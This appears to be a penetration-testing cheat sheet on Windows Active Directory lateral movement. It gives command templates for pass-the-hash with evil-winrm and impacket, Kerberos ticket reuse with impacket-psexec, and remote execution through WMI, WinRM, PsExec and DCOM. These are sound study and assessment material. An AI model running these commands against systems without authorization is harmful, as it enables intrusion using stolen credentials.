# Lateral movement checks

[← Active Directory quick reference](../05-active-directory.md)

Match access to open service: WMI/DCOM 135; WinRM 5985/5986; SMB exec 445 + admin + usable share. Test identity first.

## Password or NT hash

```bash
evil-winrm -i <target-ip> -u <user> -p '<password>'
impacket-wmiexec <domain.tld>/<user>:<password>@<target-ip>
```

```bash
evil-winrm -i <target-ip> -u <user> -H <nt-hash>
impacket-wmiexec -hashes :<nt-hash> <domain.tld>/<user>@<target-ip>
```

Pass the Hash needs NT hash + NTLM service. NetNTLMv2 is not passable.

## Kerberos ticket

NT hash → TGT; keep cache tied to account/domain.

```bash
impacket-getTGT <domain.tld>/<user> -hashes :<nt-hash>
export KRB5CCNAME=<user>.ccache
impacket-psexec -k -no-pass <domain.tld>/<user>@<target-fqdn>
```

TGS is SPN-specific. Failure: check FQDN, SPN, DNS, clock.

## Direct WMI check

```powershell
$password = ConvertTo-SecureString '<password>' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $password)
$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName <target-ip> -Credential $credential -SessionOption $options
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = 'cmd /c hostname'}
```

Track source → destination, account, access, result. Authentication ≠ command execution.

## Windows-side alternatives

WinRS/PowerShell remoting → WinRM. PsExec → SMB + service-control access.

```cmd
winrs -r:<target-host> -u:<domain>\<user> -p:<password> "cmd /c hostname & whoami"
```

```powershell
$password = ConvertTo-SecureString '<password>' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $password)
$session = New-PSSession -ComputerName <target-host> -Credential $credential
Enter-PSSession $session
```

```powershell
.\PsExec64.exe \\<target-host> -u <domain>\<user> -p <password> cmd
```

DCOM/MMC: local admin + RPC; use file-output proof because process may run in session 0.

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1', '<target-host>'))
$dcom.Document.ActiveView.ExecuteShellCommand('cmd', $null, '/c hostname > C:\Windows\Temp\dcom-check.txt', '7')
```
